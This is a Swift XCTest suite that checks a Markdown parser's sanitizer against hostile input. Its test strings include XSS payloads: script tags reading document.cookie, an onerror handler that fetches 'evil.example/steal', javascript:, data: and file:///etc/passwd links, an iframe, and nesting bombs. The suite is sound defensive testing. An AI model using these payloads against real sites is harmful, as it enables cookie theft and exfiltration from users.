import XCTest
@testable import PreviewCore

/// Hostile-input coverage for Markdown parsing/sanitization: scripts,
/// event handlers, dangerous URL schemes, entity/data-URI smuggling, and
/// pathological recursive/size structures. Every case must either sanitize
/// the dangerous construct away (with a non-empty diagnostic) or fail
/// gracefully — never execute anything, never silently succeed with the
/// dangerous content intact, and never crash or hang.
final class MarkdownHostileInputTests: XCTestCase {
    func testRawScriptTagIsStrippedFromInlineHTML() {
        let document = MarkdownParser.parse("before <script>alert(document.cookie)</script> after")
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("<script"))
        XCTAssertFalse(allText.lowercased().contains("alert"))
        XCTAssertFalse(document.sanitizerDiagnostics.isEmpty)
    }

    func testEventHandlerAttributeIsStrippedFromInlineHTML() {
        let document = MarkdownParser.parse(#"<img src="x.png" onerror="fetch('https://evil.example/steal')">"#)
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("onerror"))
        XCTAssertFalse(allText.lowercased().contains("evil.example"))
    }

    func testJavascriptURISchemeLinkIsClassifiedUnsafe() {
        let document = MarkdownParser.parse("[click me](javascript:alert(1))")
        guard case .paragraph(let inlines) = document.blocks.first, case .link(let destination, _, _) = inlines.first else {
            return XCTFail("expected link")
        }
        guard case .unsafeOrUnrecognized(let scheme) = destination.scheme else {
            return XCTFail("expected javascript: to be classified unsafe, got \(destination.scheme)")
        }
        XCTAssertEqual(scheme.lowercased(), "javascript")
        XCTAssertTrue(destination.requiresConfirmationInUntrustedWorkspace)
    }

    func testDataURISchemeLinkIsClassifiedUnsafe() {
        let document = MarkdownParser.parse("[data](data:text/html,<script>alert(1)</script>)")
        guard case .paragraph(let inlines) = document.blocks.first, case .link(let destination, _, _) = inlines.first else {
            return XCTFail("expected link")
        }
        guard case .unsafeOrUnrecognized = destination.scheme else {
            return XCTFail("expected data: to be classified unsafe")
        }
    }

    func testFileURISchemeLinkIsClassifiedUnsafe() {
        let document = MarkdownParser.parse("[secrets](file:///etc/passwd)")
        guard case .paragraph(let inlines) = document.blocks.first, case .link(let destination, _, _) = inlines.first else {
            return XCTFail("expected link")
        }
        guard case .unsafeOrUnrecognized = destination.scheme else {
            return XCTFail("expected file: to be classified unsafe")
        }
    }

    func testHostileHREFOnRawHTMLAnchorIsStripped() {
        let document = MarkdownParser.parse(#"<a href="javascript:evil()">click</a>"#)
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("javascript:"))
    }

    func testHostileSrcOnRawHTMLImgIsStripped() {
        let document = MarkdownParser.parse(#"<img src="javascript:evil()">"#)
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("javascript:"))
    }

    func testStyleAttributeIsStrippedEvenThoughItCannotRunScriptDirectly() {
        // Inline `style` can itself carry `url(...)`/`@import` external
        // references; Kod strips it outright rather than trying to
        // sub-parse CSS for safety.
        let document = MarkdownParser.parse(#"<div style="background: url(https://evil.example/track.png)">text</div>"#)
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("evil.example"))
    }

    func testIframeElementIsStrippedEntirely() {
        let document = MarkdownParser.parse(#"<iframe src="https://evil.example/phish"></iframe>"#)
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("iframe"))
        XCTAssertFalse(allText.lowercased().contains("evil.example"))
    }

    func testMalformedNestedTagInsideScriptDoesNotLeakContent() {
        // A script body containing a stray unmatched `<` that could
        // desynchronize a naive tag-depth counter.
        let document = MarkdownParser.parse("<script>if (1 < 2) { alert('leak') }</script>after")
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.contains("leak"))
        XCTAssertTrue(allText.contains("after"))
    }

    func testUnterminatedScriptTagStripsToEndOfDocument() {
        let document = MarkdownParser.parse("before <script>alert(1)")
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("alert"))
    }

    func testHTMLCommentSmugglingAttemptIsDropped() {
        // A comment cannot smuggle a script tag past sanitization by
        // hiding inside `<!-- -->`.
        let document = MarkdownParser.parse("<!-- <script>alert(1)</script> --><b>safe</b>")
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.lowercased().contains("script"))
        XCTAssertTrue(allText.contains("safe"))
    }

    func testDeeplyNestedBlockquotesAreBoundedNotStackOverflow() {
        let depth = 5_000
        let source = String(repeating: "> ", count: depth) + "text"
        let limits = MarkdownLimits(maximumBlockDepth: 64)
        let document = MarkdownParser.parse(source, limits: limits)
        // Must produce *something* (a truncation placeholder), not crash.
        XCTAssertFalse(document.blocks.isEmpty)
    }

    func testDeeplyNestedEmphasisIsBoundedNotStackOverflow() {
        let depth = 20_000
        let source = String(repeating: "*", count: depth) + "x" + String(repeating: "*", count: depth)
        let limits = MarkdownLimits(maximumInlineDepth: 32)
        // Must return promptly with *some* result, never hang or crash.
        let document = MarkdownParser.parse(source, limits: limits)
        XCTAssertFalse(document.blocks.isEmpty)
    }

    func testPathologicallyManyBlocksIsBoundedByBlockCountLimit() {
        let source = String(repeating: "- item\n", count: 500_000)
        let limits = MarkdownLimits(maximumBlockCount: 1_000)
        let document = MarkdownParser.parse(source, limits: limits)
        XCTAssertFalse(document.blocks.isEmpty)
    }

    func testOversizedSourceIsRejectedWithoutFullyParsing() {
        let source = String(repeating: "a", count: 1_000_000)
        let limits = MarkdownLimits(maximumSourceByteCount: 100)
        let document = MarkdownParser.parse(source, limits: limits)
        XCTAssertEqual(document.blocks.count, 1)
        guard case .paragraph(let inlines) = document.blocks[0], case .text(let text) = inlines.first else {
            return XCTFail("expected a size-limit placeholder paragraph")
        }
        XCTAssertTrue(text.contains("exceeds"))
    }

    func testUnrecognizedElementTagsAreNeutralizedEvenThoughInterveningTextRemainsVisible() {
        // `<marquee>` is not inherently dangerous (no script execution,
        // no network access) and CommonMark's inline-HTML model treats
        // each tag as an independent span with ordinary text between
        // them — so the *word* "marquee" surviving as plain visible text
        // is expected and harmless. What must never survive is the tag
        // syntax itself (which a different, less careful rendering path
        // could one day reinterpret as live markup).
        let document = MarkdownParser.parse("<marquee>spinning text</marquee>")
        let allText = renderedPlainText(document)
        XCTAssertFalse(allText.contains("<marquee>"))
        XCTAssertFalse(allText.contains("</marquee>"))
    }

    func testMailtoAutolinkIsClassifiedSeparatelyFromHTTP() {
        let document = MarkdownParser.parse("<person@example.com>")
        guard case .paragraph(let inlines) = document.blocks.first, case .link(let destination, _, _) = inlines.first else {
            return XCTFail("expected mailto autolink")
        }
        XCTAssertEqual(destination.scheme, .mailto)
        XCTAssertFalse(destination.requiresConfirmationInUntrustedWorkspace == true && destination.scheme == .local)
    }

    // MARK: - Helpers

    private func renderedPlainText(_ document: MarkdownDocument) -> String {
        var output = ""
        func walkInlines(_ inlines: [MarkdownInline]) {
            for inline in inlines {
                switch inline {
                case .text(let text): output += text
                case .sanitizedHTML(let text): output += text
                case .code(let text): output += text
                case .emphasis(let children), .strong(let children), .strikethrough(let children):
                    walkInlines(children)
                case .link(_, _, let children): walkInlines(children)
                case .image(_, _, let alt): output += alt
                case .softBreak, .hardBreak: output += " "
                }
            }
        }
        func walkBlocks(_ blocks: [MarkdownBlock]) {
            for block in blocks {
                switch block {
                case .heading(_, let inlines), .paragraph(let inlines):
                    walkInlines(inlines)
                case .blockquote(let inner):
                    walkBlocks(inner)
                case .list(_, _, let items):
                    for item in items { walkBlocks(item.blocks) }
                case .codeBlock(_, let code):
                    output += code
                case .table(_, let header, let rows):
                    header.cells.forEach(walkInlines)
                    for row in rows { row.cells.forEach(walkInlines) }
                case .sanitizedHTMLBlock(let text):
                    output += text
                case .thematicBreak:
                    break
                }
            }
        }
        walkBlocks(document.blocks)
        return output
    }
}
